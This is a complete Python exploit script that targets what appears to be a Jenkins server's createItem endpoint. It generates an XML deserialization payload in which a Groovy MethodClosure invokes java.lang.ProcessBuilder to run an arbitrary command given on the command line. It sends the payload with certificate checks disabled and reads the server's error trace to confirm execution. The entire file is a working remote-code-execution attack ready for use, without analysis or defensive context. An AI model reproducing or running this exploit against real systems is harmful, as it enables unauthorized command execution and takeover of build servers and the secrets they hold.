from __future__ import print_function
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import argparse
import sys
parser = argparse.ArgumentParser()
parser.add_argument('target', type=str, help='Target IP:PORT')
parser.add_argument('command', type=str, help='Command to run on target')
parser.add_argument('--proto', choices={'http', 'https'}, default='http', help='Send exploit over http or https (default: http)')
if len(sys.argv) < 2:
    parser.print_help()
    sys.exit(1)
args = parser.parse_args()
if len(args.target.split(':')) != 2:
    print('[-] Target must be in format IP:PORT')
    sys.exit(1)
if not args.command:
    print('[-] You must specify a command to run')
    sys.exit(1)
ip, port = args.target.split(':')
print('[*] Target IP: {}'.format(ip))
print('[*] Target PORT: {}'.format(port))
xml_formatted = ''
command_list = args.command.split()
for cmd in command_list:
    xml_formatted += '{:>16}<string>{}</string>\n'.format('', cmd)
xml_payload = '''<map>
  <entry>
    <groovy.util.Expando>
      <expandoProperties>
        <entry>
          <string>hashCode</string>
          <org.codehaus.groovy.runtime.MethodClosure>
            <delegate class="groovy.util.Expando" reference="../../../.."/>
            <owner class="java.lang.ProcessBuilder">
              <command>
                {}
              </command>
              <redirectErrorStream>false</redirectErrorStream>
            </owner>
            <resolveStrategy>0</resolveStrategy>
            <directive>0</directive>
            <parameterTypes/>
            <maximumNumberOfParameters>0</maximumNumberOfParameters>
            <method>start</method>
          </org.codehaus.groovy.runtime.MethodClosure>
        </entry>
      </expandoProperties>
    </groovy.util.Expando>
   <int>1</int>
 </entry>
</map>'''.format(xml_formatted.strip())
print('[*] Generated XML payload:')
print(xml_payload)
print() 
print('[*] Sending payload')
headers = {'Content-Type': 'text/xml'}
r = requests.post('{}://{}:{}/createItem?name=rand_dir'.format(args.proto, ip, port), verify=False, headers=headers, data=xml_payload)
paths_in_trace = ['jobs/rand_dir/config.xml', 'jobs\\rand_dir\\config.xml']
if r.status_code == 500:
    for path in paths_in_trace:
        if path in r.text:
            print('[+] Command executed successfully')
            break